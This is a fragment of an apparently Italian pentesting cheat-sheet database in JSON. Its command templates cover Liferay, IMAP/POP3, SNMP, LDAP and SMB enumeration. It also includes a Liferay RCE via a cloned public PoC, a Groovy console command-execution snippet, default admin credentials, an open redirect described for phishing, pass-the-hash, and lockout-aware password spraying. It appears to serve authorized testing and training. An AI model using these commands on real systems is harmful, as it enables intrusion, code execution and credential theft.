        "description": "Conferma Liferay via licenza, login portlet e GraphQL. La versione indirizza verso i CVE noti (riferimento: liferay.dev)."
      },
      {
        "id": "jsonws",
        "label": "JSON Web Services",
        "template": "curl -sk 'http://<ip>/api/jsonws?discover'",
        "description": "Elenca i servizi JSONWS esposti: superficie d'attacco per invocare metodi interni. È anche l'endpoint della RCE CVE-2020-7961."
      },
      {
        "id": "controlpanel",
        "label": "Control Panel bypass",
        "template": "# rotte alternative al Control Panel, provale una a una\n\n# rotta standard del Control Panel\ncurl -sk 'http://<ip>/group/control_panel/manage'\n\n# rotta sul sito guest\ncurl -sk 'http://<ip>/group/guest/control_panel/manage'\n\n# rotta personale dell'utente\ncurl -sk 'http://<ip>/user/<user>/control_panel/manage'",
        "description": "Il Control Panel amministrativo è raggiungibile per più rotte: una funzionalità nascosta nel frontend resta accessibile via portlet route. Da qui si arriva alla Script Console Groovy."
      }
    ],
    "refs": [
      {
        "label": "Tarlogic — Pentesting Liferay",
        "url": "https://www.tarlogic.com/blog/pentesting-liferay-applications/"
      },
      {
        "label": "Liferay — known vulnerabilities",
        "url": "https://liferay.dev/portal/security/known-vulnerabilities"
      }
    ]
  },
  {
    "id": "liferay-exploit",
    "name": "Liferay — RCE (JSONWS / Groovy)",
    "category": "service-enum",
    "subcategory": "web-apps",
    "group": "Liferay (Portal)",
    "description": "Le due vie principali alla RCE su Liferay. CVE-2020-7961 sfrutta la deserializzazione di dati non fidati nell'API JSON Web Services (`/api/jsonws`) sulle versioni < 7.2.1, senza autenticazione, con PoC pubblici. Con accesso amministrativo, la Script Console esegue codice Groovy arbitrario, quindi comandi di sistema. Le credenziali di default `test@liferay.com:test` sono un ottimo punto di partenza.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "liferay",
      "rce",
      "deserialization",
      "groovy"
    ],
    "template": "# CVE-2020-7961 — deserializzazione JSONWS su Liferay < 7.2.1, via PoC pubblico\n\n# scarica il PoC ed entra nella cartella\ngit clone https://github.com/mzruya/CVE-2020-7961 && cd CVE-2020-7961\n\n# esegue il comando sul target\npython3 exploit.py http://<ip> '<cmd>'",
    "params": [
      {
        "key": "ip",
        "label": "Host",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "cmd",
        "label": "Comando",
        "placeholder": "id"
      },
      {
        "key": "lhost",
        "label": "LHOST",
        "placeholder": "10.10.14.5"
      }
    ],
    "variants": [
      {
        "id": "jsonws-rce",
        "label": "RCE JSONWS (CVE-2020-7961)",
        "template": "# Liferay < 7.2.1 — deserializzazione non autenticata su /api/jsonws\n# usa un PoC pubblico (es. mzruya/CVE-2020-7961 o il modulo relativo):\npython3 exploit.py http://<ip> '<cmd>'",
        "description": "Deserializzazione di dati non fidati nell'API JSONWS: RCE pre-auth. Diversi PoC su GitHub inviano un gadget Groovy/marshalsec all'endpoint. Verifica prima la versione < 7.2.1."
      },
      {
        "id": "groovy",
        "label": "Groovy Script Console",
        "template": "// incolla nella Script Console (Control Panel > Server Administration > Script):\ndef sout = new StringBuilder(), serr = new StringBuilder()\ndef proc = \"<cmd>\".execute()\nproc.consumeProcessOutput(sout, serr)\nproc.waitForOrKill(1000)\nprintln \"$sout $serr\"",
        "description": "Con accesso admin, la Script Console esegue Groovy: questo snippet lancia un comando di sistema e ne stampa l'output. Via diretta a una reverse shell come utente del server applicativo."
      },
      {
        "id": "defcreds",
        "label": "Default creds & open redirect",
        "template": "# credenziali di default classiche:\n# test@liferay.com : test\n# open redirect utili per il phishing:\ncurl -sk 'http://<ip>/html/common/referer_jsp.jsp?referer=http://<lhost>'",
        "description": "Le installazioni demo mantengono `test@liferay.com:test` con privilegi amministrativi. Gli endpoint `referer_jsp.jsp`/`forward_jsp.jsp` sono open redirect sfruttabili nel phishing."
      }
    ],
    "refs": [
      {
        "label": "Tarlogic — Pentesting Liferay",
        "url": "https://www.tarlogic.com/blog/pentesting-liferay-applications/"
      },
      {
        "label": "Liferay — known vulnerabilities",
        "url": "https://liferay.dev/portal/security/known-vulnerabilities"
      }
    ]
  },
  {
    "id": "imap-pop3-enum",
    "name": "IMAP / POP3 — enumerazione (nmap)",
    "category": "service-enum",
    "subcategory": "imap-pop3",
    "group": "Discovery",
    "description": "I server di posta in ricezione IMAP (143 in chiaro, 993 cifrato) e POP3 (110 in chiaro, 995 cifrato) annunciano le proprie capacità. Su Exchange gli script NTLM rivelano nome host e dominio interni senza autenticazione.",
    "note": "# Output atteso\nLe capacità indicano i metodi di autenticazione accettati. Gli script NTLM, dove presenti, svelano hostname e dominio. Le porte 993 e 995 usano SSL/TLS, le 143 e 110 trasmettono in chiaro.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "imap",
      "pop3"
    ],
    "tags": [
      "imap",
      "pop3",
      "mail",
      "nmap",
      "enum"
    ],
    "template": "# capacita e informazioni dei server IMAP e POP3\nnmap -p110,143,993,995 --script imap-capabilities,pop3-capabilities,imap-ntlm-info,pop3-ntlm-info <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "imap-pop3-login",
    "name": "IMAP / POP3 — accesso alla casella",
    "category": "service-enum",
    "subcategory": "imap-pop3",
    "group": "Access",
    "description": "Con credenziali valide ci si collega alla casella e si leggono i messaggi, dove spesso si trovano altre credenziali o informazioni utili. openssl apre il canale cifrato, curl scarica la posta direttamente.",
    "note": "# Opzioni\n- porta 993 per IMAP cifrato, 995 per POP3 cifrato\n- dentro IMAP: `a LOGIN <user> <password>`, poi `a LIST \"\" \"*\"` per le cartelle e `a FETCH 1 all` per leggere un messaggio",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "imap",
      "pop3"
    ],
    "tags": [
      "imap",
      "pop3",
      "mail",
      "openssl",
      "curl"
    ],
    "template": "# canale cifrato interattivo (poi i comandi IMAP a mano)\nopenssl s_client -connect <ip>:993 -quiet\n\n# in alternativa, lettura diretta con curl\ncurl -k 'imaps://<ip>' --user <user>:<password>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ]
  },
  {
    "id": "onesixtyone",
    "name": "onesixtyone — community brute",
    "category": "service-enum",
    "subcategory": "snmp",
    "group": "Discovery",
    "description": "Prova a tentativi le community string del servizio SNMP da una lista: la community è la «password» del protocollo. Trovata quella giusta, si passa a enumerare il dispositivo.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "snmp"
    ],
    "tags": [
      "onesixtyone",
      "snmp"
    ],
    "template": "onesixtyone -c <wordlist> <ip>",
    "params": [
      {
        "key": "wordlist",
        "label": "Wordlist",
        "placeholder": "/usr/share/wordlists-custom/SecLists-2026.1/Discovery/SNMP/snmp.txt"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "snmpwalk",
    "name": "snmpwalk — full walk",
    "category": "service-enum",
    "subcategory": "snmp",
    "group": "Enumeration",
    "description": "Scarica l'intero albero informativo del dispositivo via SNMP usando una community valida. Ne escono utenti, processi, software installato, interfacce di rete, instradamenti e a volte credenziali in chiaro.",
    "note": "# Opzioni\n- `-c <community>` la community string, che funziona come una password: prova prima `public` e `private`\n- `-v2c` seleziona la versione 2c del protocollo\n# Credenziali di default\nLa community è la «password» di SNMP: `public` (sola lettura) · `private` (lettura e scrittura) · `community` · `manager` · `cisco` · `admin`. Con `private` si può anche riscrivere la configurazione.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "snmp"
    ],
    "tags": [
      "snmpwalk",
      "snmp"
    ],
    "template": "snmpwalk -v2c -c <community> <ip> .1",
    "params": [
      {
        "key": "community",
        "label": "Community",
        "placeholder": "public"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Tutta la MIB",
        "template": "snmpwalk -v2c -c <community> <ip> .1",
        "description": "Walk completo dell’albero MIB."
      },
      {
        "id": "procs",
        "label": "Processi",
        "template": "snmpwalk -v2c -c <community> <ip> 1.3.6.1.2.1.25.4.2.1.2",
        "description": "Processi in esecuzione (hrSWRunName)."
      },
      {
        "id": "users",
        "label": "Utenti",
        "template": "snmpwalk -v2c -c <community> <ip> 1.3.6.1.4.1.77.1.2.25",
        "description": "Account utente (LanMan)."
      },
      {
        "id": "tcp",
        "label": "TCP aperte",
        "template": "snmpwalk -v2c -c <community> <ip> 1.3.6.1.2.1.6.13.1.3",
        "description": "Connessioni TCP locali."
      }
    ]
  },
  {
    "id": "snmpbulkwalk",
    "name": "snmpbulkwalk — fast walk",
    "category": "service-enum",
    "subcategory": "snmp",
    "group": "Enumeration",
    "description": "Come snmpwalk, ma usa richieste in blocco (GETBULK): molto più veloce sugli alberi informativi grandi. Da preferire con SNMP versione 2c.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "snmp"
    ],
    "tags": [
      "snmpbulkwalk",
      "snmp"
    ],
    "template": "snmpbulkwalk -v2c -c <community> <ip> .1",
    "params": [
      {
        "key": "community",
        "label": "Community",
        "placeholder": "public"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "braa",
    "name": "braa — mass SNMP walk",
    "category": "service-enum",
    "subcategory": "snmp",
    "group": "Enumeration",
    "description": "Interrogazione SNMP parallela e veloce. Trovata la community, estrae rapidamente molti valori su uno o più host.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "snmp"
    ],
    "tags": [
      "braa",
      "snmp"
    ],
    "template": "braa <community>@<ip>:.1.*",
    "params": [
      {
        "key": "community",
        "label": "Community",
        "placeholder": "public"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "snmp-check",
    "name": "snmp-check — enum leggibile",
    "category": "service-enum",
    "subcategory": "snmp",
    "group": "Enumeration",
    "description": "Enumera il dispositivo via SNMP presentando l'output in modo leggibile e ordinato: utenti, processi, software, interfacce, instradamenti e condivisioni.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "snmp"
    ],
    "tags": [
      "snmp-check",
      "snmp"
    ],
    "template": "snmp-check <ip> -c <community>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "community",
        "label": "Community",
        "placeholder": "public"
      }
    ],
    "refs": [
      {
        "label": "HackTricks — 161 Pentesting SNMP",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html"
      }
    ]
  },
  {
    "id": "ldap-anon",
    "name": "ldapsearch — anonymous bind",
    "category": "service-enum",
    "subcategory": "ldap",
    "group": "Anonymous",
    "description": "Esegue un bind LDAP anonimo, che spesso espone l'intera directory di dominio. Il punto di partenza sono i namingContexts, da cui si ricava il Base DN per le query successive.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "ldapsearch",
      "anonymous"
    ],
    "template": "ldapsearch -x -H ldap://<ip> -b \"\" -s base namingContexts",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "basedn",
        "label": "Base DN",
        "placeholder": "DC=corp,DC=local"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "namingContexts",
        "template": "ldapsearch -x -H ldap://<ip> -b \"\" -s base namingContexts",
        "description": "Primo passo: legge i `namingContexts` per ricavare il `Base DN`."
      },
      {
        "id": "dump",
        "label": "Dump completo",
        "template": "ldapsearch -x -H ldap://<ip> -b \"<basedn>\" -s sub \"(objectClass=*)\"",
        "description": "Dump dell’intero albero, se il bind anonimo lo consente."
      }
    ]
  },
  {
    "id": "ldap-auth",
    "name": "ldapsearch — authenticated dump",
    "category": "service-enum",
    "subcategory": "ldap",
    "group": "Authenticated",
    "description": "Scarica gli utenti con credenziali valide, mostrando il campo descrizione, dove a volte ci sono password, e userAccountControl, che rivela gli account con proprietà particolari.",
    "note": "# Credenziali di default\nProva prima il bind anonimo (senza utente). Sugli appliance: `cn=admin,dc=<dominio>:admin` · `admin:admin` · `cn=Directory Manager:password`.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "ldapsearch",
      "users"
    ],
    "template": "ldapsearch -x -H ldap://<ip> -D '<user>@<domain>' -w '<password>' -b \"<basedn>\" \"(objectClass=user)\" sAMAccountName description memberOf userAccountControl",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "basedn",
        "label": "Base DN",
        "placeholder": "DC=corp,DC=local"
      }
    ]
  },
  {
    "id": "ldap-desc",
    "name": "ldapsearch — password in description",
    "category": "service-enum",
    "subcategory": "ldap",
    "group": "Authenticated",
    "description": "Filtra i soli oggetti che hanno il campo descrizione popolato: spesso vi finiscono password o note operative lasciate dagli amministratori.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "ldapsearch",
      "description"
    ],
    "template": "ldapsearch -x -H ldap://<ip> -D '<user>@<domain>' -w '<password>' -b \"<basedn>\" \"(description=*)\" sAMAccountName description",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "basedn",
        "label": "Base DN",
        "placeholder": "DC=corp,DC=local"
      }
    ]
  },
  {
    "id": "windapsearch",
    "name": "windapsearch — AD enum",
    "category": "service-enum",
    "subcategory": "ldap",
    "group": "Authenticated",
    "description": "Enumerazione della directory di dominio via LDAP: utenti, gruppi e computer.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "windapsearch",
      "ldap",
      "ad"
    ],
    "template": "windapsearch -d <domain> -u <user>@<domain> -p <password> --dc-ip <ip> -U -G -C",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "note": "# Opzioni\n- `-U` utenti · `-G` gruppi · `-C` computer\n- `-m <gruppo>` i membri di un gruppo\n- `--da` elenca i Domain Admins"
  },
  {
    "id": "nxc-ldap-users",
    "name": "nxc ldap — users & BloodHound",
    "category": "service-enum",
    "subcategory": "ldap",
    "group": "Authenticated",
    "description": "Enumera gli utenti via LDAP. Con `--bloodhound` raccoglie in un colpo i dati per BloodHound; il modulo che estrae le descrizioni svela le password lasciate in quel campo.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "nxc",
      "netexec",
      "ldap",
      "bloodhound"
    ],
    "template": "nxc ldap <ip> -u '<user>' -p '<password>' --users",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Utenti",
        "template": "nxc ldap <ip> -u '<user>' -p '<password>' --users",
        "description": "Elenca gli utenti di dominio con il loro stato."
      },
      {
        "id": "desc",
        "label": "Password nelle description",
        "template": "nxc ldap <ip> -u '<user>' -p '<password>' -M get-desc-users",
        "description": "Modulo che estrae il campo description di tutti gli utenti."
      },
      {
        "id": "bloodhound",
        "label": "BloodHound",
        "template": "nxc ldap <ip> -u '<user>' -p '<password>' --bloodhound --collection All --dns-server <ip>",
        "description": "Raccolta dati per BloodHound (`--collection All`)."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — 389 Pentesting LDAP",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html"
      }
    ]
  },
  {
    "id": "nxc-ldap-gmsa",
    "name": "nxc ldap — gMSA passwords",
    "category": "service-enum",
    "subcategory": "ldap",
    "group": "Authenticated",
    "description": "Legge le password dei Group Managed Service Account via LDAP. Funziona se l'utente e tra i principal autorizzati a leggerle.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "nxc",
      "netexec",
      "ldap",
      "gmsa"
    ],
    "template": "nxc ldap <ip> -u '<user>' -p '<password>' --gmsa",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "refs": [
      {
        "label": "HackTricks — 389 Pentesting LDAP",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html"
      }
    ],
    "note": "# Errori comuni\nL'opzione `--gmsa` appartiene al protocollo ldap, non a smb, e richiede la versione cifrata LDAPS (porta 636)."
  },
  {
    "id": "nxc-smb-null",
    "name": "nxc smb — null session shares",
    "category": "service-enum",
    "subcategory": "smb",
    "group": "Null Session",
    "description": "La null session va sempre provata per prima: con utente e password vuoti molti server espongono condivisioni guest e anonime, più comuni di quanto si pensi.",
    "note": "# Credenziali di default\nOltre alla null session (`-u '' -p ''`): `guest:` (vuota) · `administrator:administrator` · `admin:admin` · `administrator:password`. L'account guest abilitato è sorprendentemente comune.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "nxc",
      "netexec",
      "smb",
      "null-session"
    ],
    "template": "nxc smb <ip> -u '' -p '' --shares",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "NetExec Wiki — SMB enumeration",
        "url": "https://www.netexec.wiki/smb-protocol/enumeration"
      },
      {
        "label": "HackTricks — 445 Pentesting SMB",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb"
      }
    ]
  },
  {
    "id": "smbclient-list",
    "name": "smbclient — list shares",
    "category": "service-enum",
    "subcategory": "smb",
    "group": "Null Session",
    "description": "Elenca le condivisioni del server in null session, cioe senza credenziali.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "smbclient",
      "shares"
    ],
    "template": "smbclient -N -L //<ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "note": "# Opzioni\n`-N` evita la richiesta di password (sessione null)."
  },
  {
    "id": "smbclient-access",
    "name": "smbclient — access a share",
    "category": "service-enum",
    "subcategory": "smb",
    "group": "Null Session",
    "description": "Apre una condivisione per navigarla con `ls`, `cd`, `get` e `mget`. Conviene tentare prima l'accesso anonimo e poi quello con le credenziali trovate.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "smbclient",
      "shares",
      "access"
    ],
    "template": "smbclient //<ip>/<share> -N",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "share",
        "label": "Share",
        "placeholder": "Departments"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "anon",
        "label": "Anonimo",
        "template": "smbclient //<ip>/<share> -N",
        "description": "Accesso senza credenziali (null session)."
      },
      {
        "id": "creds",
        "label": "Con credenziali",
        "template": "smbclient //<ip>/<share> -U '<user>%<password>'",
        "description": "Accesso autenticato alla share."
      }
    ],
    "refs": [
      {
        "label": "smbclient — man page",
        "url": "https://www.samba.org/samba/docs/current/man-html/smbclient.1.html"
      }
    ],
    "note": "# Opzioni\n- `-N` sessione null, senza password\n- `-U '<user>%<password>'` login autenticato\n- `-c '...'` esegue comandi senza entrare nella shell interattiva"
  },
  {
    "id": "nxc-smb-shares",
    "name": "nxc smb — authenticated shares",
    "category": "service-enum",
    "subcategory": "smb",
    "group": "Authenticated Enum",
    "description": "Elenca le condivisioni con i permessi di lettura e scrittura usando credenziali valide.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "nxc",
      "smb",
      "shares"
    ],
    "template": "nxc smb <ip> -u '<user>' -p '<password>' --shares",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "hash",
        "label": "Hash NTLM",
        "placeholder": "aad3b435...",
        "ctx": "hash"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Password",
        "template": "nxc smb <ip> -u '<user>' -p '<password>' --shares",
        "description": "Autenticazione con password."
      },
      {
        "id": "hash",
        "label": "NTLM hash",
        "template": "nxc smb <ip> -u '<user>' -H <hash> --shares",
        "description": "Pass-the-Hash con hash NTLM (niente password)."
      }
    ],
    "note": "# Opzioni\n`-H <hash>` autentica con l'hash NTLM invece della password (Pass-the-Hash)."
  },
  {
    "id": "enum4linux-ng",
    "name": "enum4linux-ng — full enum",
    "category": "service-enum",
    "subcategory": "smb",
    "group": "Authenticated Enum",
    "description": "Enumerazione SMB completa in un solo comando: utenti, gruppi, policy delle password, condivisioni e sessioni. Funziona sia in forma anonima sia con credenziali.",
    "platform": "linux",
    "requires": [
      "no-creds",
      "password"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "enum4linux",
      "smb"
    ],
    "template": "enum4linux-ng -A <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "anon",
        "label": "Anonimo",
        "template": "enum4linux-ng -A <ip>",
        "description": "Null session, senza credenziali. Su Windows moderni spesso restituisce poco."
      },
      {
        "id": "creds",
        "label": "Con credenziali",
        "template": "enum4linux-ng -A -u '<user>' -p '<password>' <ip>",
        "description": "Enum autenticata: supera le restrizioni sul null session e vede molto di più."
      }
    ]
  },
  {
    "id": "nxc-smb-rid",
    "name": "nxc smb — RID brute",
    "category": "service-enum",
    "subcategory": "smb",
    "group": "Authenticated Enum",
    "description": "Enumera utenti, gruppi e computer forzando gli identificativi SID e RID uno per uno. Copertura migliore di `--users`, perché trova anche gli oggetti che l'enumerazione normale non mostra.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "nxc",
      "smb",
      "rid-brute"
    ],
    "template": "nxc smb <ip> -u '<user>' -p '<password>' --rid-brute",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ]
  },
  {
    "id": "nxc-smb-users",
    "name": "nxc smb — users + descriptions",
    "category": "service-enum",
    "subcategory": "smb",
    "group": "Authenticated Enum",
    "description": "Elenca gli utenti del dominio con il loro campo descrizione, dove a volte finiscono password o note.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "nxc",
      "smb",
      "users"
    ],
    "template": "nxc smb <ip> -u '<user>' -p '<password>' --users",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ]
  },
  {
    "id": "nxc-smb-groups",
    "name": "nxc smb — groups",
    "category": "service-enum",
    "subcategory": "smb",
    "group": "Authenticated Enum",
    "description": "Enumera i gruppi del dominio; indicando un nome di gruppo, ne elenca i membri.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "nxc",
      "smb",
      "groups"
    ],
    "template": "nxc smb <ip> -u '<user>' -p '<password>' --groups",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "group",
        "label": "Gruppo",
        "placeholder": "Domain Admins"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Tutti i gruppi",
        "template": "nxc smb <ip> -u '<user>' -p '<password>' --groups",
        "description": "Elenca tutti i gruppi di dominio."
      },
      {
        "id": "members",
        "label": "Membri di un gruppo",
        "template": "nxc smb <ip> -u '<user>' -p '<password>' --groups '<group>'",
        "description": "Elenca i membri del gruppo indicato (es. `Domain Admins`)."
      },
      {
        "id": "local",
        "label": "Gruppi locali",
        "template": "nxc smb <ip> -u '<user>' -p '<password>' --local-groups",
        "description": "Gruppi locali della macchina, non di dominio."
      }
    ],
    "note": "# Opzioni\n- `--groups` tutti i gruppi del dominio\n- `--groups '<group>'` i membri di quel gruppo\n- `--local-groups` i gruppi locali della macchina"
  },
  {
    "id": "nxc-smb-passpol",
    "name": "nxc smb — password policy",
    "category": "service-enum",
    "subcategory": "smb",
    "group": "Authenticated Enum",
    "description": "Legge la policy delle password del dominio: soglia di blocco, durata del blocco e finestra di osservazione. Va letta prima di qualsiasi password spray, perché un giro di troppo blocca gli account e brucia l'accesso.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "nxc",
      "smb",
      "pass-pol"
    ],
    "template": "nxc smb <ip> -u '<user>' -p '<password>' --pass-pol",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "note": "# Output atteso\nCon soglia di blocco maggiore di zero, la regola sicura è un solo tentativo per finestra, distribuito su molti utenti."
  },
  {
    "id": "nxc-smb-sessions",
    "name": "nxc smb — sessions & logged-on",
    "category": "service-enum",
    "subcategory": "smb",
    "group": "Authenticated Enum",
    "description": "Mostra chi e connesso al server: sessioni SMB attive e utenti collegati. Serve a capire dove si trovano gli amministratori, bersagli per il movimento laterale.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "nxc",
      "smb",
      "sessions",
      "loggedon"
    ],
    "template": "nxc smb <ip> -u '<user>' -p '<password>' --loggedon-users",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "loggedon",
        "label": "Utenti loggati",
        "template": "nxc smb <ip> -u '<user>' -p '<password>' --loggedon-users",
        "description": "Chi è loggato adesso sulla macchina."
      },
      {
        "id": "sessions",
        "label": "Sessioni SMB",
        "template": "nxc smb <ip> -u '<user>' -p '<password>' --smb-sessions",
        "description": "Sessioni SMB attive verso l'host."
      }
    ],
    "note": "# Opzioni\n- `--loggedon-users` utenti attualmente collegati (spesso richiede l'amministratore locale)\n- `--smb-sessions` sessioni SMB attive"
  },
  {
    "id": "nxc-smb-gpp",
    "name": "nxc smb — GPP password (MS14-025)",
    "category": "service-enum",
